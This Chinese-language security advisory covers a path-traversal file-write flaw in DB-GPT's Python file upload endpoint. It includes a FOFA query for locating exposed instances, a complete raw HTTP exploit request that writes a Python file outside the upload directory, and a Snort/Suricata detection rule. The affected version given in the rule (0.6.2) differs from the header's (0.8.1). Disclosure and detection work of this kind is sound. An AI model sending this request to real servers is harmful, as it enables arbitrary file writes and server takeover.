# DB-GPT-upload-跨路径文件写入

DB-GPT-upload-跨路径文件写入，攻击者可执行任意命令导致服务器被控。

# 影响版本

DB-GPT <= 0.8.1

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：icon_hash="100632689"

POC/EXP：

```
POST /api/v1/python/file/upload HTTP/1.1
Host: 127.0.0.1
user-id: ../../../../../../../../../../tmp
Content-Type: multipart/form-data; boundary=----Boundary1752894263714

------Boundary1752894263714
Content-Disposition: form-data; name="file"; filename="33223.py"
Content-Type: text/x-python

print("33223")
------Boundary1752894263714--
```

![image-20260907100337201](assets/image-20260907100337201.png)

sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"DB-GPT - /api/v1/python/file/upload 跨路径文件写入 (user-id 路径穿越 + Python文件上传)";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri;
        content:"/api/v1/python/file/upload";
        fast_pattern;
    http.content_type; content:"multipart/form-data";
    http.request_body;
        content:"filename="; nocase;
        content:".py"; distance:0; nocase;
    http.header_names;
        content:"user-id";
    http.raw_header;
        content:"../../"; nocase;
    metadata:
        service http,
        affected_product "DB-GPT <=0.6.2",
        vulnerability_type "Arbitrary File Write via Path Traversal",
        severity "critical";
    classtype:web-application-attack;
    sid:1000732;
    rev:1;
    priority:1;
)
```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
